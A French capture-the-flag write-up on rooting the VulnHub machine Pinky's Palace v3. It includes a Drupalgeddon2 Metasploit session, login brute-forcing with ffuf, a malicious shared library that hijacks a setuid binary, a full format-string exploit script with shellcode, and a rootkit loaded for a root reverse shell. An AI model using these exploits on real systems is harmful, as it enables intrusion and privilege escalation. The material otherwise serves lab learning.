---
title: "Solution du CTF Pinky's Palace v3 de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

## 1tro

[Pinky's Palace: v3](https://vulnhub.com/entry/pinkys-palace-v3,237/) est un CTF créé par [Pink_Panther](https://twitter.com/Pink_P4nther) et disponible sur *VulnHub*. Je le mettrais dans la catégorie des difficiles.

Comme pour le [précédent opus]({% link _posts/2023-04-19-Solution-du-CTF-Pinky-Palace-v2-de-VulnHub.md %}) la première partie concernant l'exploitation web a été assez compliquée et j'ai du piocher des indices sur le web pour me débloquer. Il s'avérait alors que mes idées étaient les bonnes, mais que je ne disposais pas forcément de la bonne wordlist ou de la bonne implémentation.

Pour le reste, on a à un moment une exploitation de binaire. J'ai fini par avoir la flemme de reprendre à zéro et j'ai repris un code d'exploitation que j'avais précédemment écrit. En modifiant moins de 10 lignes mon code m'a donné le shell que j'espérais.

## Let's go

On trouve sur la machine un FTP autorisant les connexions anonymes, un serveur web sur le port 8000 et le SSH sur le port 5555 :

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
5555/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
8000/tcp open  http    nginx 1.10.3
```

Sur le FTP on remarque un dossier caché composé de 3 points avec à l'intérieur un script bash nommé `firewall.sh` :

```console
ftp> ls -a
229 Entering Extended Passive Mode (|||19335|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        111          4096 May 14  2018 .
drwxr-xr-x    3 0        111          4096 May 14  2018 ..
drwxr-xr-x    3 0        0            4096 May 14  2018 ...
-rw-r--r--    1 0        0             173 May 14  2018 WELCOME
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||41266|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 May 14  2018 .
drwxr-xr-x    3 0        111          4096 May 14  2018 ..
drwxr-xr-x    2 0        0            4096 May 15  2018 .bak
226 Directory send OK.
ftp> cd .bak
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||38584|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 15  2018 .
drwxr-xr-x    3 0        0            4096 May 14  2018 ..
-rwxr--r--    1 0        0             190 May 15  2018 firewall.sh
226 Directory send OK.
ftp> get firewall.sh
local: firewall.sh remote: firewall.sh
229 Entering Extended Passive Mode (|||35781|)
150 Opening BINARY mode data connection for firewall.sh (190 bytes).
100% |*********************************************************************************************************************************************************************|   190       86.02 KiB/s    00:00 ETA
226 Transfer complete.
190 bytes received in 00:00 (68.82 KiB/s)
```

Je ne suis pas expert `iptables` (loin de là) mais je dirais que ça va nous bloquer les reverse-shell (nouvelles connexions sortantes) :

```bash
#!/bin/bash
#FIREWALL
iptables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
```

Il n'est possible d'écrire dans aucun des dossiers que l'on a croisés.

Sur le port 8000 je trouve un Drupal. J'ai utilisé `droopescan` qui n'a pas remonté grand-chose d'intéressant :

```console
$ docker run --rm droope/droopescan scan drupal -u http://192.168.56.186:8000/ --enumerate a
[+] Plugins found:                                                              
    profile http://192.168.56.186:8000/modules/profile/
    php http://192.168.56.186:8000/modules/php/
    image http://192.168.56.186:8000/modules/image/

[+] Themes found:
    seven http://192.168.56.186:8000/themes/seven/
    garland http://192.168.56.186:8000/themes/garland/

[+] Possible version(s):
    7.57

[+] Possible interesting urls found:
    Default changelog file - http://192.168.56.186:8000/CHANGELOG.txt
```

Je m'en suis remis à Metasploit et son module d'exploitation `drupalgeddon2`. Il fallait prendre soin à prendre un payload adapté aux règles du parefeu :

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.56.186   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        8000             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/bind_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  192.168.56.186   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Started bind TCP handler against 192.168.56.186:4444
[*] Command shell session 1 opened (192.168.56.79:35133 -> 192.168.56.186:4444) at 2023-04-19 17:07:22 +0200

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686 GNU/Linux
```

J'ai ensuite rapatrié un [Fahrj/reverse-ssh: Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh). Pour ce faire je suis passé par le `ncat` qui était présent sur le système (écoute sur la VM et envoi depuis ma machine).

Malgré son nom, cet outil permet aussi d'écouter sur un port (par défaut le 31337) et agit comme un serveur SSH classique pour lequel le mot de passe est `letmeinbrudipls`.

Une fois mon accès récupéré je trouve les identifiants de l'accès SQL :

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'dpink',
      'password' => 'drupink',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Puis l'identifiant du *Drupal* :

```sql
MariaDB [drupal]> select name, pass from users;
+-----------+---------------------------------------------------------+
| name      | pass                                                    |
+-----------+---------------------------------------------------------+
|           |                                                         |
| pinkadmin | $S$DDLlBhU7uSuGiPBv1gqEL1QDM1G2Nf3SQOXQ6TT7zsAE3IBZAgup |
+-----------+---------------------------------------------------------+
2 rows in set (0.00 sec)
```

J'ai tenté de casser le hash mais ça n'a mené nulle part.

## Wow such files

J'ai commencé à étudier le système, à commencer par les utilisateurs :

```
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
pinksec:x:1001:1001::/home/pinksec:/bin/bash
pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
```

Il y a des fichiers assez inhabituels comme un binaire nommé après l'utilisateur et un fichier vide dans `/var/lib/sudo/lectured/` :

```console
www-data@pinkys-palace:/$ find / -name pinky -ls 2> /dev/null 
   132073     40 -rwxr-xr-x   1 root     root        38804 Feb 22  2017 /usr/bin/pinky
  2883586      4 drwx------   2 pinky    pinky        4096 May 15  2018 /home/pinky
  3933731      0 -rw-------   1 root     pinky           0 May 14  2018 /var/lib/sudo/lectured/pinky
```

C'est encore plus vrai quand on liste les fichiers dont le nom contient *pink* :

```console
www-data@pinkys-palace:/var/www/html$ find / -iname "*pink*" -ls 2> /dev/null 
   132073     40 -rwxr-xr-x   1 root     root        38804 Feb 22  2017 /usr/bin/pinky
   133571      4 -rw-r--r--   1 root     root          893 Feb 22  2017 /usr/share/man/man1/pinky.1.gz
  2883592      4 drwx------   5 pinksec  pinksec      4096 May 14  2018 /home/pinksec
  2883586      4 drwx------   2 pinky    pinky        4096 May 15  2018 /home/pinky
  2883600      4 drwx------   2 pinksecmanagement pinksecmanagement     4096 May 14  2018 /home/pinksecmanagement
  3936057      4 drwx------   2 mysql             mysql                 4096 May 10  2018 /var/lib/mysql/pinksec
  3933731      0 -rw-------   1 root              pinky                    0 May 14  2018 /var/lib/sudo/lectured/pinky
  2097536      8 -rwxrwxrwx   1 root              root                  7136 May 14  2018 /lib/libpinksec.so
```

Le dossier `/var/lib/mysql/pinksec` correspond juste à une base de données MySQL nommée `pinksec`.

On note la présence d'une librairie word-writable. Elle ne comprend rien de critique. On trouve trois fonctions `ps*` exportées :

```console
www-data@pinkys-palace:/var/www/html$ nm -D /lib/libpinksec.so
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
         w _Jv_RegisterClasses
00002018 B __bss_start
         w __cxa_finalize
         w __gmon_start__
00002018 D _edata
0000201c B _end
00000608 T _fini
000003ec T _init
         U printf
000005ab T psbanner
00000580 T psopt
000005d6 T psoptin
         U puts
```

Pour le moment, impossible de trouver un binaire qui l'utilise.

Il y a bien ce binaire setuid que `LinPEAS` m'a remonté, mais je ne peux pas le lire pour le moment :

```
-rwsrwx--- 1 pinky pinksecmanagement 7.3K May 14  2018 /usr/local/bin/PSMCCLI (Unknown SUID binary!)
```

## Scannez local

Je remarque deux ports (en plus du MySQL) qui écoutent localement.

```console
www-data@pinkys-palace:/etc/apache2$ ss -lntp
State      Recv-Q Send-Q                                                            Local Address:Port                                                                           Peer Address:Port              
LISTEN     0      80                                                                    127.0.0.1:3306                                                                                      *:*                  
LISTEN     0      128                                                                   127.0.0.1:80                                                                                        *:*                  
LISTEN     0      128                                                                           *:5555                                                                                      *:*                  
LISTEN     0      128                                                                   127.0.0.1:65334                                                                                     *:*                  
LISTEN     0      128                                                                           *:8000                                                                                      *:*                   users:(("nginx",pid=402,fd=6),("nginx",pid=400,fd=6))
LISTEN     0      128                                                                          :::31337                                                                                    :::*                   users:(("reverse-sshx86",pid=908,fd=3))
LISTEN     0      128                                                                          :::80                                                                                       :::*                   users:(("nginx",pid=402,fd=7),("nginx",pid=400,fd=7))
LISTEN     0      128                                                                          :::5555                                                                                     :::*                  
LISTEN     0      32                                                                           :::21                                                                                       :::*
```

Ils sont liés à Apache comme indiqué dans le fichier `ports.conf` :

```apache
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 127.0.0.1:80
Listen 127.0.0.1:65334
<IfModule ssl_module>
        Listen 443
</IfModule>

<IfModule mod_gnutls.c>
        Listen 443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

On peut voir dans `sites-available/000-default.conf` qu'ils servent des fichiers appartenant à l'utilisateur `pinksec` :

```apache
<VirtualHost 127.0.0.1:80>
    # The ServerName directive sets the request scheme, hostname and port that
    # the server uses to identify itself. This is used when creating
    # redirection URLs. In the context of virtual hosts, the ServerName
    # specifies what hostname must appear in the request's Host: header to
    # match this virtual host. For the default virtual host (this file) this
    # value is not decisive as it is used as a last resort host regardless.
    # However, you must set it for any further virtual host explicitly.
    #ServerName www.example.com

    ServerAdmin pinkyadmin@localhost
    DocumentRoot /home/pinksec/html
    <Directory "/home/pinksec/html">
    Order allow,deny
    Allow from all
    Require all granted
    </Directory>
    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
    # error, crit, alert, emerg.
    # It is also possible to configure the loglevel for particular
    # modules, e.g.
    #LogLevel info ssl:warn

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    # For most configuration files from conf-available/, which are
    # enabled or disabled at a global level, it is possible to
    # include a line for only one particular virtual host. For example the
    # following line enables the CGI configuration for this host only
    # after it has been globally disabled with "a2disconf".
    #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
<VirtualHost 127.0.0.1:65334>
    DocumentRoot /home/pinksec/database
    ServerAdmin pinkyadmin@localhost
    <Directory "/home/pinksec/database">
    Order allow,deny
    Allow from all
    Require all granted
    </Directory>
</VirtualHost>
```

Sur l'un on trouve une mire de login demandant login, mot de passe et code PIN de 5 chiffres et sur l'autre juste une page avec le message *DATABASE Under Development* qui semble retournée même en cas de 404.

Pour être plus à l'aise je forwarde le port 80 sur le port 8080 de ma machine en passant par le `reverse-ssh` :

```bash
ssh -p 31337 -N -L 8080:127.0.0.1:80 192.168.56.186
```

La requête de login a le format suivant :

```bash
curl 'http://127.0.0.1:8080/login.php' -X POST --data-raw 'user=pinksec&pass=password&pin=12345'
```

J'ai lancé `Wapiti` dessus, mais aucune vulnérabilité n'est ressortie.

## En quatre couleurs

J'ai énuméré comme un fou les deux sites web puis j'ai eu un flash sur le message *DATABASE Under Development*.

J'avais déjà énuméré les fichiers txt, html, php et zip et j'ai du coup recherché aussi ceux qui pourraient correspondre à un dump de base de données : sql, dump, bak.

Finalement je suis passé à côté de l'extension `.db` et c'est ce qui était attendu. Pas trop de regrets toutefois, car il fallait trouver un fichier `pwds.db` or le mot `pwds` n'est même pas présent dans la wordlist `raft-large-words.txt` qui sert généralement de référence.

On obtenait alors le fichier texte suivant :

```
FJ(J#J(R#J
JIOJoiejwo
JF()#)PJWEOFJ
Jewjfwej
jvmr9e
uje9fu
wjffkowko
ewufweju
pinkyspass
consoleadmin
administrator
admin
P1nK135Pass
AaPinkSecaAdmin4467
password4P1nky
Bbpinksecadmin9987
pinkysconsoleadmin
pinksec133754
```

J'ai créé une wordlist d'utilisateurs avec les utilisateurs unix et le compte du Drupal :

```
pinky
pinksec
pinksecmanagement
pinkadmin
```

J'ai d'abord écrit un script Python qui pour un utilisateur donné va tester pour chaque mot de passe tous les PINs possibles (soit `cent mille possibilités * le nombre de mot de passe`).

Mon script remontait tous les cas qui n'avaient pas cette réponse :

```html
<p>Incorrect Username Or Password Or Pin.</p>
```

Et effectivement il aurait trouvé le cas où le mot de passe et le nom d'utilisateur était correct, mais pas le PIN :

```html
<p>Incorrect Username Or Password or Pin.
```

On voit que la réponse est sensiblement différente.

Mais `ffuf` est plus efficace, car il est multithreadé et surtout son mécanisme d'énumération fait qu'il trouve plus rapidement le cas particulier (peut-être part-il de la dernière wordlist, auquel cas c'est du pur hasard) :

```console
$ ffuf -u http://127.0.0.1:8080/login.php -X POST -d "user=USER&pass=PASS&pin=PIN" -H "Content-type: application/x-www-form-urlencoded" -w /tmp/users.txt:USER -w /tmp/pass.txt:PASS -w /tmp/numbers.txt:PIN -fr "Incorrect Username Or Password Or Pin."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://127.0.0.1:8080/login.php
 :: Wordlist         : USER: /tmp/users.txt
 :: Wordlist         : PASS: /tmp/pass.txt
 :: Wordlist         : PIN: /tmp/numbers.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : user=USER&pass=PASS&pin=PIN
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Incorrect Username Or Password Or Pin.
________________________________________________

[Status: 200, Size: 41, Words: 6, Lines: 1]
    * PASS: AaPinkSecaAdmin4467
    * PIN: 00000
    * USER: pinkadmin

[Status: 200, Size: 41, Words: 6, Lines: 1]
    * USER: pinkadmin
    * PASS: AaPinkSecaAdmin4467
    * PIN: 00001
--- snip ---
```

Il suffit d'enchainer sur la recherche du PIN :

```console
$ ffuf -u http://127.0.0.1:8080/login.php -X POST -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=PIN" -H "Content-type: application/x-www-form-urlencoded"  -w /tmp/numbers.txt:PIN  -fs 41
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://127.0.0.1:8080/login.php
 :: Wordlist         : PIN: /tmp/numbers.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=PIN
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 41
________________________________________________

55849                   [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## Capitaine Hook

Une fois connecté sur l'interface web avec les bons identifiants, on tombe sur un formulaire permettait de faire exécuter des commandes système.

Elles sont toutes exécutées avec les droits de l'utilisateur `pinksec`. Je trouve quelques identifiants sur le système :

```php
pinksec@pinkys-palace:~$ cat html/config.php 
<?php
$DB_USER = "psec";
$DB_PASS = "FJ#90)FJ#@j";
$DB_HOST = "localhost";
$DB_NAME = "pinksec";
?>
```

Mais surtout un binaire setuid pour `pinksecmanagement` dans le dossier `bin` :

```
./bin:
total 16
drwxr-xr-x 2 pinksec           pinksec           4096 May 15  2018 .
drwx------ 6 pinksec           pinksec           4096 Apr 19 12:59 ..
-rwsr-xr-x 1 pinksecmanagement pinksecmanagement 7508 May 13  2018 pinksecd

```

C'est ce fichier qui est lié à la librairie world-writable :

```console
pinksec@pinkys-palace:~/bin$ ldd pinksecd 
        linux-gate.so.1 (0xb7fd9000)
        libpinksec.so => /lib/libpinksec.so (0xb7fc9000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e12000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```

Le binaire fait appel aux fonctions de la librairie qui se chargent seulement d'afficher des chaines de caractères comme la bannière, le message d'aide, etc :

```console
pinksec@pinkys-palace:~/bin$ ./pinksecd 
[+] PinkSec Daemon [+]
Options: -d: daemonize, -h: help
Soon to be host of pinksec web application.
```

Voici le dump ASM du binaire :

```nasm
int main (int argc, char **argv, char **envp);
; var int32_t var_14h @ stack - 0x14
; arg char **argv @ stack + 0x4
0x000006d0      lea     ecx, [argv]
0x000006d4      and     esp, 0xfffffff0
0x000006d7      push    dword [ecx - 4]
0x000006da      push    ebp
0x000006db      mov     ebp, esp
0x000006dd      push    esi
0x000006de      push    ebx
0x000006df      push    ecx
0x000006e0      sub     esp, 0xc
0x000006e3      call    __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x000006e8      add     ebx, 0x1918
0x000006ee      mov     esi, ecx
0x000006f0      call    psbanner   ; sym.imp.psbanner
0x000006f5      call    psopt      ; sym.imp.psopt
0x000006fa      cmp     dword [esi], 2
0x000006fd      jne     0x713
0x000006ff      mov     eax, dword [esi + 4]
0x00000702      add     eax, 4
0x00000705      mov     eax, dword [eax]
0x00000707      sub     esp, 0xc
0x0000070a      push    eax
0x0000070b      call    psoptin    ; sym.imp.psoptin
0x00000710      add     esp, 0x10
0x00000713      sub     esp, 0xc
0x00000716      lea     eax, [ebx - 0x1840]
0x0000071c      push    eax        ; const char *s
0x0000071d      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x00000722      add     esp, 0x10
0x00000725      mov     eax, 0
0x0000072a      lea     esp, [var_14h]
0x0000072d      pop     ecx
0x0000072e      pop     ebx
0x0000072f      pop     esi
0x00000730      pop     ebp
0x00000731      lea     esp, [ecx - 4]
0x00000734      ret
```

Je me suis basé sur les prototypes des fonctions que `Cutter` affichait et j'ai écrit le code C suivant :

```c
#include <unistd.h>
#include <stdlib.h>

void psopt(void) {
        setreuid(1002, 1002);
        setregid(1002, 1002);
        system("/bin/bash");
}


void psbanner(void) {
        setreuid(1002, 1002);
        setregid(1002, 1002);
        system("/bin/bash");
}

void psoptin(int x) {
        setreuid(1002, 1002);
        setregid(1002, 1002);
        system("/bin/bash");
}
```

Ça a marché du premier coup :

```console
pinksec@pinkys-palace:/tmp$ gcc -o libpinksec.so lib.c -shared -fPIC -Wl,-soname -Wl,libhook.so
pinksec@pinkys-palace:/tmp$ cp /lib/libpinksec.so /tmp/back_libpinksec.so
pinksec@pinkys-palace:/tmp$ cat libpinksec.so > /lib/libpinksec.so
pinksec@pinkys-palace:/tmp$ ~/bin/pinksecd 
bash: /home/pinksec/.bashrc: Permission denied
pinksecmanagement@pinkys-palace:/tmp$ id
uid=1002(pinksecmanagement) gid=1001(pinksec) groups=1001(pinksec)
```

## Cétautomatix

Avec ce nouvel utilisateur, on peut accéder au binaire `/usr/local/bin/PSMCCLI` vu précédemment qui est setuid `pinky`.

Il est vulnérable à une exploitation de chaine de format :

```nasm
argshow (const char *format);
; arg const char *format @ stack + 0x4
0x0804849b      push    ebp
0x0804849c      mov     ebp, esp
0x0804849e      push    ebx
0x0804849f      sub     esp, 4
0x080484a2      call    __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x080484a7      add     ebx, 0x1b59
0x080484ad      sub     esp, 0xc
0x080484b0      lea     eax, [ebx - 0x1a30]
0x080484b6      push    eax        ; const char *format
0x080484b7      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484bc      add     esp, 0x10
0x080484bf      sub     esp, 0xc
0x080484c2      push    dword [format] ; const char *format
0x080484c5      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484ca      add     esp, 0x10
0x080484cd      sub     esp, 0xc
0x080484d0      push    0xa        ; 10 ; int c
0x080484d2      call    putchar    ; sym.imp.putchar ; int putchar(int c)
0x080484d7      add     esp, 0x10
0x080484da      sub     esp, 0xc
0x080484dd      push    0          ; int status
0x080484df      call    exit       ; sym.imp.exit ; void exit(int status)
```

J'avais commencé à jouer un peu avec, par exemple avec ce script qui permet de voir à quel offset (position sur la pile) nos données sont reflétées :

```python
import subprocess

for offset in range(5000):
    try:
        output = subprocess.check_output(["/usr/local/bin/PSMCCLI", "AAAA%{}$.8x".format(offset)])
    except subprocess.CalledProcessError:
        continue
    else:
        if "4141" in output.decode():
            print("Got output {} with offset {}".format(output, offset))
```

On obtenait ainsi :

```console
pinksecmanagement@pinkys-palace:~$ python3 brute.py 
Got output b'[+] Args: AAAA41410049\n' with offset 133
Got output b'[+] Args: AAAA31254141\n' with offset 134
```

Mais au bout d'un moment, j'en ai eu marre et j'ai juste repris le code d'exploitation automatique que j'avais écrit pour [mon tutoriel sur l'exploitation des chaines de format]({% link _posts/2014-08-04-Pwing-echo-Exploitation-d-une-faille-de-chaine-de-format.md %}).

Il m'aura suffi de modifier les lignes gérant la façon dont le binaire affiche ses données et les lignes concernant la cible de l'écriture (ici on veut réécrire l'adresse de `putchar` dans la `GOT`) et c'était fini :

```python
import subprocess
import sys
import os
import struct

if len(sys.argv) < 2:
    print "Usage {0} <binary>".format(sys.argv[0])
    sys.exit()

TARGET = sys.argv[1]
if not (TARGET.startswith("./") or TARGET.startswith("/")):
    TARGET = "./" + TARGET

SHELLCODE = (
        # Does a setreuid(1000, 1000)
        "\x31\xC0\xB0\x46\x31\xDB\x66\xBB\xE8\x03\x89\xD9\xCD\x80"
        # execve(/bin/sh) I found on exploit-db
        "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
)

# Putting shellcode in environment
os.putenv("SHELLCODE", SHELLCODE)

def just(i):
    return str(i).rjust(3, "0")

offset = 0

# Looking for shellcode in memory process using format string
for padding in xrange(0, 4):
    for i in xrange(500):
        try:
            # We make the binary display the memory adresse, the '~' character, then the data at that address
            output = subprocess.check_output([TARGET, '%{0}$.8x~%{0}$s'.format(just(i)) + "." * padding])
            if "SHELLCODE=" in output:
                print(output)
                for line in output.split("\n"):
                    if "SHELLCODE=" in line:
                        # we extract the adress which is before the '~' character but after the prompt of the binary
                        offset = int(line.split("~")[0].split(": ")[1], 16) + 10
                        print "[*] Shellcode is at address", hex(offset), "in process memory"
                        break
        except subprocess.CalledProcessError:
            continue
    if offset:
        break

if not offset:
    print "[!] Can't find shellcode in process memory"
    sys.exit()

# Let's overwrite putchar in the GOT
putchar = 0x804a01c
addresses = struct.pack("I", putchar)
addresses += struct.pack("I", putchar + 1)
addresses += struct.pack("I", putchar + 2)
addresses += struct.pack("I", putchar + 3)

def split_addr(n):
    result = []
    n1 = n & 0xFF
    n2 = (n >> 8) & 0xFF
    n3 = (n >> 16) & 0xFF
    n4 = (n >> 24) & 0xFF
    while n1 <= 16:
        n1 += 0x100
    result.append(n1 - 16)
    while n2 <= n1:
        n2 += 0x100
    result.append(n2 - n1)
    while n3 <= n2:
        n3 += 0x100
    result.append(n3 - n2)
    while n4 <= n3:
        n4 += 0x100
    result.append(n4 - n3)
    return result

found = False
arg = ""

# Looking for correct args positions and padding
for padding in xrange(0, 4):
    for i in xrange(500):
        arg = "AAAABBBBCCCCDDDD%008x%{0}$.8x%008x%{1}$.8x%008x%{2}$.8x%008x%{3}$.8x012345678912".format(just(i), just(i+1), just(i+2), just(i+3)) + "Z" * padding
        try:
            output = subprocess.check_output([TARGET, arg])
        except subprocess.CalledProcessError:
            continue
        if '41414141' in output and '42424242' in output and '43434343' in output and '44444444' in output:
            print "[*] Buffer starts at offset #", i, "with", padding, "bytes of padding"
            print "[*] String used is:", arg, 'length =', len(arg)
            print "[*] ===== output ====="
            print output
            print "[*] =================="

            # Generating evil format string
            values = split_addr(offset)
            arg  = addresses
            arg += "%{0}c%{1}$hhn%{2}c%{3}$hhn%{4}c%{5}$hhn%{6}c%{7}$hhn012345678912".format(just(values[0]), just(i), just(values[1]), just(i+1), just(values[2]), just(i+2), just(values[3]), just(i+3))
            arg += "Z" * padding
            found = True
            break
    if found:
        break

# Launching binary with the final payload
if found:
    print "[*] Exploiting with format string", repr(arg)
    subprocess.call([TARGET, arg])
```

Mon exploit lance le binaire dans un environnement contrôlé avec le shellcode qui est présent. Il détermine d'abord l'adresse du shellcode dans la mémoire du processus puis génère la chaine de format qui permettra d'écraser `putchar` par l'adresse du shellcode :

```console
pinksecmanagement@pinkys-palace:~$ python fmt.py /usr/local/bin/PSMCCLI
[+] Args: bfffffb8~SHELLCODE=1��F1�f����̀1�j
                                           XQh//shh/bin��̀

[*] Shellcode is at address 0xbfffffc2L in process memory
[*] Buffer starts at offset # 137 with 2 bytes of padding
[*] String used is: AAAABBBBCCCCDDDD%008x%137$.8x%008x%138$.8x%008x%139$.8x%008x%140$.8x012345678912ZZ length = 82
[*] ===== output =====
[+] Args: AAAABBBBCCCCDDDDbffff6b441414141b7ffed0042424242080484a7434343430000000044444444012345678912ZZ

[*] ==================
[*] Exploiting with format string '\x1c\xa0\x04\x08\x1d\xa0\x04\x08\x1e\xa0\x04\x08\x1f\xa0\x04\x08%178c%137$hhn%061c%138$hhn%256c%139$hhn%192c%140$hhn012345678912ZZ'
$ id
uid=1000(pinky) gid=1002(pinksecmanagement) groups=1002(pinksecmanagement)
```

Preuve que mon code fonctionne bien :)

## La syntaxe absolue dans l'ensemble des exercices du module

Notre dernier utilisateur, pinky, est autorisé à charger un module noyau :

```
pinky@pinkys-palace:~$ sudo -l
Matching Defaults entries for pinky on pinkys-palace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinky may run the following commands on pinkys-palace:
    (ALL) NOPASSWD: /sbin/insmod
    (ALL) NOPASSWD: /sbin/rmmod
```

Je pensais d'abord compiler et charger [m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64)](https://github.com/m0nad/Diamorphine) comme pour le CTF [KI]({% link _posts/2022-11-04-Solution-du-CTF-Ki-de-VulnHub.md %}) mais cette backdoor générait une erreur étrange de permission lors du chargement.

Finalement l'auteur du CTF a un rootkit parmi ses projets : [PinkP4nther/Pinkit: A quick LKM rootkit that executes a reverse TCP netcat shell with root privileges.](https://github.com/PinkP4nther/Pinkit)

Et celui-ci s'est chargé correctement. Il faut juste éditer le code préalablement, car le module fait appel à des exécutables qui ne sont pas forcément au bon endroit sur la machine (`/bin` au lieu de `/usr/bin`).

```console
pinky@pinkys-palace:~/Pinkit$ make
make -C /lib/modules/4.9.0-6-686/build M=/home/pinky/Pinkit modules
make[1]: Entering directory '/usr/src/linux-headers-4.9.0-6-686'
  CC [M]  /home/pinky/Pinkit/pinkit.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/pinky/Pinkit/pinkit.mod.o
  LD [M]  /home/pinky/Pinkit/pinkit.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-6-686'
pinky@pinkys-palace:~/Pinkit$ sudo /sbin/insmod pinkit.ko
```

La charge consiste à donner un reverse-shell sur le port 1337, il faut donc écouter sur ce port :

```console
$ ncat -l -p 1337 -v
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:54822.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _              __     _______ 
|  _ \ __ _| | __ _  ___ __\ \   / /___ / 
| |_) / _` | |/ _` |/ __/ _ \ \ / /  |_ \ 
|  __/ (_| | | (_| | (_|  __/\ V /  ___) |
|_|   \__,_|_|\__,_|\___\___| \_/  |____/ 
                                          
[+][+][+][+][+] R00T [+][+][+][+][+]
[+] Congrats on Pwning Pinky's Palace V3!
[+] Flag: 73b5f7ea50ccf91bb5d1ecb6aa94ef1c
[+] I hope you enjoyed and learned from this box!
[+] If you have feedback send me it on Twitter!
[+] Twitter: @Pink_P4nther
